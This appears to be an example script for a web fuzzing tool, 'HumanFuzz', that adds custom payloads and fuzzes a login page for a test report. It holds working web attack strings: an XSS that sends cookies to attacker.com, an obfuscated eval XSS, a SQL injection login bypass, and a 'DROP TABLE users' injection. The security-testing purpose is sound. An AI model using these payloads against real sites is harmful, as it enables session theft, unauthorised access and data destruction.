"""
Example of using custom payloads with HumanFuzz.
"""

from humanfuzz import HumanFuzzer
from humanfuzz.payloads import Payload

def main():
    # Create a fuzzer instance
    fuzzer = HumanFuzzer()
    
    # Create custom payloads
    custom_xss_payloads = [
        Payload("<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>", 
                "xss", "Cookie Stealer", "XSS payload that steals cookies"),
        Payload("<img src=x onerror=\"eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))\">", 
                "xss", "Base64 Domain Alert", "XSS with base64 encoded domain alert")
    ]
    
    custom_sqli_payloads = [
        Payload("admin' OR 1=1 --", "sqli", "Admin Login", "SQLi to bypass admin login"),
        Payload("'; DROP TABLE users; --", "sqli", "Drop Table", "SQLi to drop users table")
    ]
    
    try:
        # Start a fuzzing session
        fuzzer.start_session("https://example.com/login")
        
        # Add custom payloads to the payload manager
        for payload in custom_xss_payloads:
            fuzzer.payload_manager.payload_modules["xss"].payloads.append(payload)
            
        for payload in custom_sqli_payloads:
            fuzzer.payload_manager.payload_modules["sqli"].payloads.append(payload)
        
        # Fuzz the current page with custom payloads
        findings = fuzzer.fuzz_current_page()
        
        # Print findings
        print(f"Found {len(findings)} potential vulnerabilities")
        for finding in findings:
            print(f"- {finding['type']} ({finding['severity']}): {finding['description']}")
            print(f"  Payload: {finding['payload']}")
            
        # Generate a report
        fuzzer.generate_report("custom_payloads_report.html")
        print(f"Report saved to custom_payloads_report.html")
        
    finally:
        # Always close the fuzzer to clean up resources
        fuzzer.close()

if __name__ == "__main__":
    main()
